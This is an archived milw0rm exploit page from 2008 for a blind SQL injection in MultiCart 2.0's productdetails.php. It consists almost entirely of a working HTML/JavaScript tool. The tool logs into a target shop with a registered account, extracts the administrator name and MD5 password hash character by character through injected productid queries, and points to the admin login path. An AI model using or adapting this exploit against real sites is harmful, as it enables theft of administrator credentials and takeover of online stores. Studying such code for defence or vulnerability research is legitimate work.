<html><head><title>MultiCart 2.0 (productdetails.php) Remote SQL Injection Exploit</title></head><pre>&lt;html&gt;
&lt;head&gt;
&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
.style1{color: #CC0000}
.style2 { color: #000000;  font-size: 12px;}
.style3 {color: #FF0000; font-weight: bold; font-size: 12px; }
.style4 {color: #FF0000; font-size: 10px;}
--&gt;
&lt;/style&gt;
&lt;title&gt;MultiCart 2.0 Remote SQL Injection Vulnerbility&lt;/title&gt;
&lt;script language=&quot;Javascript&quot; type=&quot;text/javascript&quot;&gt;
/*
	-------------------------------------------------------------------------------
	- MultiCart Blind SQL Injection Exploit (productdetails.php) -
	- Info ----------------------------------------------------------------------
	- SAVE AS exploit.HTML and RUN in FIREFOX -----------------
	- Author: t0pP8uZz &amp; xprog -------------------------------------------
	- Exploit Coded By t0pP8uZz -----------------------------------------
	- Site: h4ck-y0u.org / milw0rm.com ---------------------------------
	------------------------------------------------------------------------------
	- Needs Registration First!           ------------------------------------
	- Peace --------------------------------------------------------------------
	------------------------------------------------------------------------------
*/

var site, user, pass, tbl, pid, res = &quot;&quot;;

function Start() {
	
	site = document.getElementById(&quot;site&quot;).value;
	user = document.getElementById(&quot;user&quot;).value;
	pass = document.getElementById(&quot;pass&quot;).value;
	tbl  = document.getElementById(&quot;tbl&quot;).value;
	pid  = document.getElementById(&quot;pid&quot;).value;
	
	Login();
	Main(1, 48);
}

function Main(substr, num) {

	var url = site+&quot;/productdetails.php?productid=&quot;+pid+&quot;%20and%20ascii(substring((SELECT concat(admin_name,0x3a,admin_password) FROM &quot;+tbl+&quot;),&quot;+substr+&quot;,1))=&quot;+num+&quot;/*&quot;;
	
	netscape.security.PrivilegeManager.enablePrivilege(&quot;UniversalBrowserRead&quot;);
	
	var xmlhttp = new XMLHttpRequest();
	
	xmlhttp.onreadystatechange = function() {
	
		if(xmlhttp.readyState == 4) {
		
			var content = xmlhttp.responseText;
			if(content.match(/doesn't exist/i)) { alert(&quot;Table '&quot;+tbl+&quot;' Doesnt Exist! Try Another..&quot;); return false; }
			
			var ele = document.getElementById(&quot;output&quot;);
			if(!content.match(/SQL syntax/i)) { res += String.fromCharCode((num)); ele.value = res; num = 48; substr++; }
			else { if(num == 59) { num = 96; } else { num++; }}
			
			if(res.match(&quot;:&quot;)) { 
				var check = res.split(&quot;:&quot;);
				if(check[1].length &gt;= 32) { alert(&quot;Site Exploited! Admin Details: &quot;+res); return true;}
			}
			Main(substr, num);
		}
	};
	xmlhttp.open(&quot;GET&quot;, url, true);
	xmlhttp.send(null);
};


function Login() {

	var data = 'txtUserName='+user+'&amp;txtPassword='+pass+'&amp;loginbox=+';
	netscape.security.PrivilegeManager.enablePrivilege(&quot;UniversalBrowserRead&quot;);
	
	try {
		var xmlhttp = new XMLHttpRequest();
	}
	catch(e) { alert(&quot;Use Firefox!\n\n\nError: &quot; + e.description); }
	
	xmlhttp.open(&quot;POST&quot;, site + &quot;/index.php&quot;, true);
	
	xmlhttp.setRequestHeader(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9&quot;);
	xmlhttp.setRequestHeader(&quot;Content-Length&quot;, data.length);
	xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
	
	xmlhttp.send(data);
};
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p class=&quot;style1&quot;&gt;- MultiCart 2.0 Remote Blind SQL Injection Vulnerbility -&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;Site: &lt;input type=&quot;text&quot; id=&quot;site&quot; /&gt; (URL to multicart site ie: http://www.site.com/multicart)&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;Table: &lt;input type=&quot;text&quot; id=&quot;tbl&quot; /&gt; (settings table name, default: &quot;multicart_settings&quot; others used: &quot;mc_settings&quot;, &quot;settings&quot;)&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;User: &lt;input type=&quot;text&quot; id=&quot;user&quot; /&gt; (Register on the site first, then enter username here)&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;Pass: &lt;input type=&quot;text&quot; id=&quot;pass&quot; /&gt; (Register on the site first, then enter password here)&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;PID: &lt;input type=&quot;text&quot; id=&quot;pid&quot; /&gt; (a valid product ID)&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;Start();&quot; id=&quot;button&quot; value=&quot;Exploit&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;style3&quot;&gt;Output: &lt;input type=&quot;text&quot; id=&quot;output&quot; size=&quot;100&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;style2&quot;&gt;Notes: MultiCart uses the MD5 algorithms, The admin login is at /admin/&lt;/p&gt;
&lt;p class=&quot;style4&quot;&gt;Coded By t0pP8uZz - h4ck-y0u.org&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2008-02-20]</pre></html>